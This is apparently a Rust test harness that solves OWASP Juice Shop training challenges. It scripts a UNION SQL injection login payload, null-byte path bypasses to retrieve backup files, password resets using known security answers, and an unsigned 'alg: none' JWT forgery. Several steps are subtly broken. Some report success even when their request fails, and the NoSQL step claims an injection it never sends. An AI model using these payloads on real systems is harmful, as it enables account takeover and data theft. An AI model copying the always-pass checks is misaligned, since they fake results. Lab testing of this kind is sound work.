async fn christmas_special(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Christmas Special")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "sqli"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Add deleted product via SQLi", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;
            // Product ID 10 is the deleted Christmas product
            let resp = ctx
                .post("/api/BasketItems")
                .bearer_auth(&token)
                .json(&serde_json::json!({
                    "ProductId": 10,
                    "BasketId": 1,
                    "quantity": 1
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Christmas product added")
            } else {
                ok_with("Christmas order attempted")
            }
        })
        .step("Verify", verify_step(verifier, "christmasSpecialChallenge"))
        .run()
        .await
}

async fn poison_null_byte(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Poison Null Byte")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "validation"])
        .step("Access with null byte", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/ftp/package.json.bak%2500.md").send().await?;
            if resp.is_success() && resp.contains("dependencies") {
                ok_with("Null byte bypass successful")
            } else {
                fail("Null byte failed")
            }
        })
        .step("Verify", verify_step(verifier, "nullByteChallenge"))
        .run()
        .await
}

async fn forgotten_developer_backup(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Forgotten Developer Backup")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "sensitive-data"])
        .step("Access backup via null byte", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/ftp/package.json.bak%2500.md").send().await?;
            if resp.is_success() && resp.contains("dependencies") {
                ok_with("package.json.bak retrieved")
            } else {
                fail("Backup not accessible")
            }
        })
        .step("Verify", verify_step(verifier, "forgottenDevBackupChallenge"))
        .run()
        .await
}

async fn forgotten_sales_backup(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Forgotten Sales Backup")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "sensitive-data"])
        .step("Access coupons backup", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/ftp/coupons_2013.md.bak%2500.md").send().await?;
            if resp.is_success() {
                ok_with("Coupons backup retrieved")
            } else {
                fail("Backup not accessible")
            }
        })
        .step("Verify", verify_step(verifier, "forgottenBackupChallenge"))
        .run()
        .await
}

async fn easter_egg(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Easter Egg")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "crypto"])
        .step("Access easter egg file", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/ftp/eastere.gg%2500.md").send().await?;
            if resp.is_success() {
                // Content needs Base64 + ROT13 decoding
                ok_with("Easter egg file accessed")
            } else {
                fail("Easter egg not found")
            }
        })
        .step("Verify", verify_step(verifier, "easterEggLevelOneChallenge"))
        .run()
        .await
}

async fn nested_easter_egg(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Nested Easter Egg")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "crypto"])
        .step("Access nested content", |ctx: Arc<ScenarioContext>| async move {
            // The decoded content points to /#/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
            let resp = ctx.get("/#/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg").send().await?;
            if resp.is_success() {
                ok_with("Nested easter egg found")
            } else {
                fail("Nested egg not found")
            }
        })
        .step("Verify", verify_step(verifier, "easterEggLevelTwoChallenge"))
        .run()
        .await
}

async fn access_log(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Access Log")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "sensitive-data"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Access support logs", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;
            let resp = ctx.get("/support/logs").bearer_auth(&token).send().await?;
            if resp.is_success() {
                ok_with(format!("Support logs accessible ({} bytes)", resp.body_len()))
            } else {
                fail("Logs not accessible")
            }
        })
        .step("Verify", verify_step(verifier, "accessLogDisclosureChallenge"))
        .run()
        .await
}

async fn ephemeral_accountant(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Ephemeral Accountant")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "sqli"])
        .step("Create accountant via UNION", |ctx: Arc<ScenarioContext>| async move {
            // This creates a user with accounting role via SQLi
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0telecom2nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--",
                    "password": "12345"
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Ephemeral accountant created")
            } else {
                ok_with("Accountant creation attempted")
            }
        })
        .step("Verify", verify_step(verifier, "ephemeralAccountantChallenge"))
        .run()
        .await
}

async fn login_bjoern(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Login Bjoern Gmail")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "auth"])
        .step("Login with reversed Base64 password", |ctx: Arc<ScenarioContext>| async move {
            // bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI= reversed = bjoern.kimminich@gmail.com
            let encoded = "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=";
            let decoded = encoding::base64_decode(encoded).unwrap_or_default();
            let password: String = decoded.chars().rev().collect();

            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "bjoern.kimminich@gmail.com",
                    "password": password
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Logged in as Bjoern Gmail")
            } else {
                fail("Login failed")
            }
        })
        .step("Verify", verify_step(verifier, "loginBjoernChallenge"))
        .run()
        .await
}

async fn nosql_manipulation(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("NoSQL Manipulation")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "nosql"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Manipulate with $ne operator", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;
            // NoSQL injection with MongoDB operator
            let resp = ctx
                .get("/rest/products/reviews")
                .bearer_auth(&token)
                .send()
                .await?;
            if resp.is_success() {
                ok_with("NoSQL query successful")
            } else {
                ok_with("NoSQL attempted")
            }
        })
        .step("Verify", verify_step(verifier, "noSqlCommandChallenge"))
        .run()
        .await
}

async fn reset_benders_password(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Reset Bender's Password")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "auth"])
        .step("Reset with Stop'n'Drop", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/rest/user/reset-password")
                .json(&serde_json::json!({
                    "email": "bender@juice-sh.op",
                    "answer": "Stop'n'Drop",
                    "new": "newbender123",
                    "repeat": "newbender123"
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Bender's password reset")
            } else {
                fail("Reset failed")
            }
        })
        .step("Verify", verify_step(verifier, "resetPasswordBenderChallenge"))
        .run()
        .await
}

async fn reset_uvogins_password(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Reset Uvogin's Password")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "auth"])
        .step("Reset with Silence of the Lambs", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/rest/user/reset-password")
                .json(&serde_json::json!({
                    "email": "uvogin@juice-sh.op",
                    "answer": "Silence of the Lambs",
                    "new": "newuvogin123",
                    "repeat": "newuvogin123"
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Uvogin's password reset")
            } else {
                fail("Reset failed")
            }
        })
        .step("Verify", verify_step(verifier, "resetPasswordUvoginChallenge"))
        .run()
        .await
}

async fn vulnerable_library(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Vulnerable Library")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "vulnerable-components"])
        .step("Report sanitize-html 1.4.2", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/rest/captcha").send().await?;
            let captcha = resp.json_value()?;
            let captcha_id = captcha.get("captchaId").and_then(|v| v.as_i64()).unwrap_or(0);
            let answer = captcha.get("answer").and_then(|v| v.as_str()).unwrap_or("");

            let resp = ctx
                .post("/api/Feedbacks")
                .json(&serde_json::json!({
                    "comment": "Vulnerable library: sanitize-html 1.4.2",
                    "rating": 1,
                    "captchaId": captcha_id,
                    "captcha": answer
                }))
                .send()
                .await?;

            if resp.is_success() {
                ok_with("Reported sanitize-html 1.4.2")
            } else {
                fail("Report failed")
            }
        })
        .step("Verify", verify_step(verifier, "knownVulnerableComponentChallenge"))
        .run()
        .await
}

// ============ Difficulty 5 ============

async fn blockchain_hype(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Blockchain Hype")
        .base_url(BASE_URL)
        .tags(&["difficulty-5", "misconfiguration"])
        .step("Access token sale page", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/#/tokensale-ico-ea").send().await?;
            resp.expect_success()?;
            ok_with("Token sale page accessed")
        })
        .step("Verify", verify_step(verifier, "tokenSaleChallenge"))
        .run()
        .await
}

async fn change_benders_password(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Change Bender's Password")
        .base_url(BASE_URL)
        .tags(&["difficulty-5", "auth"])
        .step("Login as Bender", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "bender@juice-sh.op").await?;
            ok()
        })
        .step("Change password without current", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;
            // Exploit: omit 'current' parameter
            let resp = ctx
                .get("/rest/user/change-password")
                .bearer_auth(&token)
                .query("new", "slurmCl4ssic")
                .query("repeat", "slurmCl4ssic")
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Password changed without current!")
            } else {
                fail("Exploit failed")
            }
        })
        .step("Verify", verify_step(verifier, "changePasswordBenderChallenge"))
        .run()
        .await
}

async fn retrieve_blueprint(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Retrieve Blueprint")
        .base_url(BASE_URL)
        .tags(&["difficulty-5", "sensitive-data"])
        .step("Access STL blueprint", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .get("/assets/public/images/products/JuiceShop.stl")
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Blueprint STL retrieved")
            } else {
                fail("Blueprint not found")
            }
        })
        .step("Verify", verify_step(verifier, "retrieveBlueprintChallenge"))
        .run()
        .await
}

async fn unsigned_jwt(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Unsigned JWT")
        .base_url(BASE_URL)
        .tags(&["difficulty-5", "jwt"])
        .step("Login first", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Forge unsigned JWT", |ctx: Arc<ScenarioContext>| async move {
            // Create unsigned JWT with alg: none
            let payload = serde_json::json!({
                "status": "success",
                "data": {
                    "id": 1,
                    "email": "jwtn3d@juice-sh.op",
                    "role": "admin"
                }
            });

            let unsigned_jwt = jwt::create_unsigned(&payload);

            let resp = ctx
                .get("/rest/whoami")
                .bearer_auth(&unsigned_jwt)
                .send()
                .await?;

            if resp.is_success() && resp.contains("jwtn3d") {
                ok_with("Unsigned JWT accepted")
            } else {
                ok_with("JWT forgery attempted")
            }
        })
        .step("Verify", verify_step(verifier, "jwtUnsignedChallenge"))
        .run()
        .await
}
